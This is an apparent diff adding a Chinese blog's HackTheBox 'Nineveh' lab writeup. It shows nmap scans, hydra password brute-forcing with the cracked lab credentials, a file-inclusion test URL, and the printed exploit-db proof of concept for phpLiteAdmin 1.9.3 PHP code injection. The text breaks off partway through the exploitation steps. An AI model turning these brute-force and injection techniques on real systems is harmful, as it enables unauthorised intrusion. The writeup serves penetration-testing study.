@@ -1,0 +1,818 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录枚举、口令爆破、hydra、phpLiteAdmin代码注入、任意文件包含、png包含SSH秘钥、binwalk、CVE-2021-4034、Chrookit 漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nineveh-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/05/27/Nineveh-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录枚举、口令爆破、hydra、phpLiteAdmin代码注入、任意文件包含、png包含SSH秘钥、binwalk、CVE-2021-4034、Chrookit 漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/11.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/12.png">
+<meta property="article:published_time" content="2024-05-27T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-31T06:31:10.121Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Nineveh-htb-writeup/1.png">
+  
+  
+  
+  <title>Nineveh-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nineveh-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-27 23:50" pubdate>
+          2024年5月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          19k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          160 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Nineveh-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录枚举、口令爆破、hydra、phpLiteAdmin代码注入、任意文件包含、png包含SSH秘钥、binwalk、CVE-2021-4034、Chrookit 漏洞</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://yufongg.github.io/posts/Nineveh/</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.43</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">5000</span>  <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-27 22:22 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> nineveh.htb (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span>)<br>Host is up (<span class="hljs-number">1.1</span>s latency).<br>Not shown: <span class="hljs-number">65533</span> filtered tcp ports (no-response)<br>PORT    STATE SERVICE<br><span class="hljs-number">80</span>/tcp  open  http<br><span class="hljs-number">443</span>/tcp open  https<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">32.39</span> seconds<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p80,<span class="hljs-number">443</span> -sC -sV --min-rate=<span class="hljs-number">5000</span>  <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-05-27 22:28 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> nineveh.htb (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span>)<br>Host is up (<span class="hljs-number">1.1</span>s latency).<br><br>PORT    STATE SERVICE   VERSION<br><span class="hljs-number">80</span>/tcp  open  http      Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))<br>|_http-title: Site doesn<span class="hljs-number">&#x27;</span>t have a title (text/html).<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br><span class="hljs-number">443</span>/tcp open  ssl/https Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>| tls-alpn: <br>|_  http/<span class="hljs-number">1.1</span><br>|_ssl-date: TLS randomness does not represent time<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)<br>| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR<br>| Not valid before: <span class="hljs-number">2017</span><span class="hljs-number">-07</span><span class="hljs-number">-01</span>T15:<span class="hljs-number">03</span>:<span class="hljs-number">30</span><br>|_Not valid after:  <span class="hljs-number">2018</span><span class="hljs-number">-07</span><span class="hljs-number">-01</span>T15:<span class="hljs-number">03</span>:<span class="hljs-number">30</span><br>|_http-title: Site doesn<span class="hljs-number">&#x27;</span>t have a title (text/html).<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">76.73</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、本地绑定与发现的域名地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.10.43 nineveh.htb&quot;</span> | sudo tee -a /etc/hosts<br>[sudo] kali 的密码：<br><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span> nineveh.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、简单看一下开放的WEB网站信息</p>
+<p><code>http://10.10.10.43/</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://nineveh.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://nineveh.htb/db/</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Warning: rand() expects parameter <span class="hljs-number">2</span> to be integer, <span class="hljs-type">float</span> given in /var/www/ssl/db/index.php on line <span class="hljs-number">114</span><br></code></pre></td></tr></table></figure>
+
+<p><code>http://nineveh.htb/department/login.php</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、通过对两个登录的爆破，成功发现两个网站的账号密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ hydra <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span> -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form <span class="hljs-string">&quot;/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password&quot;</span><br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use in military or secret service organizations, or <span class="hljs-keyword">for</span> illegal <span class="hljs-title function_">purposes</span> <span class="hljs-params">(this is non-binding, these *** ignore laws and ethics anyway)</span>.<br><br><span class="hljs-title function_">Hydra</span> <span class="hljs-params">(https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2024-05-27 22:27:31</span></span><br><span class="hljs-params">[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">399</span> login tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">399</span>), ~<span class="hljs-number">25</span> tries per task</span><br><span class="hljs-params">[DATA] attacking http-post-forms:<span class="hljs-comment">//10.10.10.43:443/db/index.php:password=^PASS^&amp;remember=yes&amp;login=Log+In&amp;proc_login=true:Incorrect password</span></span><br><span class="hljs-params">[STATUS] <span class="hljs-number">40.00</span> tries/min, <span class="hljs-number">40</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">359</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">00</span>:<span class="hljs-number">09</span>h, <span class="hljs-number">16</span> active</span><br><span class="hljs-params">[STATUS] <span class="hljs-number">41.67</span> tries/min, <span class="hljs-number">125</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">03</span>h, <span class="hljs-number">274</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">00</span>:<span class="hljs-number">07</span>h, <span class="hljs-number">16</span> active</span><br><span class="hljs-params">[<span class="hljs-number">443</span>][http-post-form] host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.43</span>   login: admin   password: password123</span><br><span class="hljs-params">[STATUS] <span class="hljs-number">57.00</span> tries/min, <span class="hljs-number">399</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">07</span>h, <span class="hljs-number">1</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">5</span> active</span><br><span class="hljs-params"></span><br><span class="hljs-params">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-params">└─$ sudo hydra nineveh.htb -l admin -P /usr/share/wordlists/rockyou.txt http-post-form <span class="hljs-string">&quot;/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password&quot;</span> </span><br><span class="hljs-params">[sudo] kali 的密码：</span><br><span class="hljs-params">Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use in military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="hljs-params"></span><br><span class="hljs-params">Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2024-05-27 22:32:25</span></span><br><span class="hljs-params">[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">14344399</span> login tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">14344399</span>), ~<span class="hljs-number">896525</span> tries per task</span><br><span class="hljs-params">[DATA] attacking http-post-form:<span class="hljs-comment">//nineveh.htb:80/department/login.php:username=^USER^&amp;password=^PASS^:Invalid Password</span></span><br><span class="hljs-params">[STATUS] <span class="hljs-number">197.00</span> tries/min, <span class="hljs-number">197</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">14344202</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">1213</span>:<span class="hljs-number">34</span>h, <span class="hljs-number">16</span> active</span><br><span class="hljs-params">[STATUS] <span class="hljs-number">213.67</span> tries/min, <span class="hljs-number">641</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">03</span>h, <span class="hljs-number">14343758</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">1118</span>:<span class="hljs-number">52</span>h, <span class="hljs-number">16</span> active</span><br><span class="hljs-params">[STATUS] <span class="hljs-number">186.14</span> tries/min, <span class="hljs-number">1303</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">07</span>h, <span class="hljs-number">14343096</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">1284</span>:<span class="hljs-number">15</span>h, <span class="hljs-number">16</span> active</span><br><span class="hljs-params">[STATUS] <span class="hljs-number">161.47</span> tries/min, <span class="hljs-number">2422</span> tries in <span class="hljs-number">00</span>:<span class="hljs-number">15</span>h, <span class="hljs-number">14341977</span> to <span class="hljs-keyword">do</span> in <span class="hljs-number">1480</span>:<span class="hljs-number">24</span>h, <span class="hljs-number">16</span> active</span><br><span class="hljs-params">[<span class="hljs-number">80</span>][http-post-form] host: nineveh.htb   login: admin   password: <span class="hljs-number">1</span>q2w3e4r5t</span><br></code></pre></td></tr></table></figure>
+
+<p><code>https://nineveh.htb/db/</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">password123<br></code></pre></td></tr></table></figure>
+
+<p><code>http://nineveh.htb/department/login.php</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">admin:<span class="hljs-number">1</span>q2w3e4r5t<br></code></pre></td></tr></table></figure>
+
+<p>6、经过简单的尝试，发现这里存在任意文件包含漏洞</p>
+<p><code>http://nineveh.htb/department/manage.php</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt</code></p>
+<p><code>http://nineveh.htb/department/manage.php?notes=../files/ninevehNotes.txt</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>7、同时在另一个db目录的后台地址那，发现了PHP代码注入漏洞</p>
+<p><code>https://nineveh.htb/db/index.php</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit phpLiteAdmin     <br>------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                                                                                        |  Path<br>------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>phpLiteAdmin - <span class="hljs-string">&#x27;table&#x27;</span> SQL Injection                                                                                                                  | php/webapps/<span class="hljs-number">38228.</span>txt<br>phpLiteAdmin <span class="hljs-number">1.1</span> - Multiple Vulnerabilities                                                                                                           | php/webapps/<span class="hljs-number">37515.</span>txt<br>PHPLiteAdmin <span class="hljs-number">1.9</span><span class="hljs-number">.3</span> - Remote PHP Code Injection                                                                                                        | php/webapps/<span class="hljs-number">24044.</span>txt<br>phpLiteAdmin <span class="hljs-number">1.9</span><span class="hljs-number">.6</span> - Multiple Vulnerabilities                                                                                                         | php/webapps/<span class="hljs-number">39714.</span>txt<br>------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit -m <span class="hljs-number">24044</span>    <br>  Exploit: PHPLiteAdmin <span class="hljs-number">1.9</span><span class="hljs-number">.3</span> - Remote PHP Code Injection<br>      URL: https:<span class="hljs-comment">//www.exploit-db.com/exploits/24044</span><br>     Path: /usr/share/exploitdb/exploits/php/webapps/<span class="hljs-number">24044.</span>txt<br>    Codes: OSVDB<span class="hljs-number">-89126</span><br> Verified: True<br>File Type: ASCII text<br>Copied to: /home/kali/Desktop/<span class="hljs-number">24044.</span>txt<br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ cat <span class="hljs-number">24044.</span>txt <br># Exploit Title: phpliteadmin &lt;= <span class="hljs-number">1.9</span><span class="hljs-number">.3</span> Remote PHP Code Injection Vulnerability<br># Google Dork: inurl:phpliteadmin.php (Default PW: admin)<br># Date: <span class="hljs-number">01</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2013</span><br># Exploit Author: L@usch - http:<span class="hljs-comment">//la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt</span><br># Vendor Homepage: http:<span class="hljs-comment">//code.google.com/p/phpliteadmin/</span><br># Vendor Status: Informed<br># Software Link: http:<span class="hljs-comment">//phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip</span><br># Version: <span class="hljs-number">1.9</span><span class="hljs-number">.3</span><br># Tested on: Windows and Linux<br><br>Description:<br><br>phpliteadmin.php#<span class="hljs-number">1784</span>: <span class="hljs-string">&#x27;Creating a New Database&#x27;</span> =&gt;<br>phpliteadmin.php#<span class="hljs-number">1785</span>: <span class="hljs-string">&#x27;When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.&#x27;</span>,<br><br>An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.<br><br>Proof of Concept:<br><br><span class="hljs-number">1.</span> We create a db named <span class="hljs-string">&quot;hack.php&quot;</span>.<br>(Depending on Server configuration sometimes it will not work and the name <span class="hljs-keyword">for</span> the db will be <span class="hljs-string">&quot;hack.sqlite&quot;</span>. Then simply try to rename the database / existing database to <span class="hljs-string">&quot;hack.php&quot;</span>.)<br>The script will store the sqlite database in the same directory as phpliteadmin.php.<br>Preview: http:<span class="hljs-comment">//goo.gl/B5n9O</span><br>Hex preview: http:<span class="hljs-comment">//goo.gl/lJ5iQ</span><br><br><span class="hljs-number">2.</span> Now create a new table in this database and insert a text field with the <span class="hljs-keyword">default</span> value:<br>&lt;?php phpinfo()?&gt;<br>Hex preview: http:<span class="hljs-comment">//goo.gl/v7USQ</span><br><br><span class="hljs-number">3.</span> Now we run hack.php<br><br>Done!<br><br>Proof: http:<span class="hljs-comment">//goo.gl/ZqPVL </span><br></code></pre></td></tr></table></figure>
+
+<p>8、按照提示进行创建利用</p>
+<p><code>https://nineveh.htb/db/index.php</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://nineveh.htb/db/index.php?switchdb=%2Fvar%2Ftmp%2Frce.php</code></p>
+<p><img src="http://sh1yan.top/photo/Nineveh-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>https://nineveh.htb/db/index.php?action=table_create</code></p>
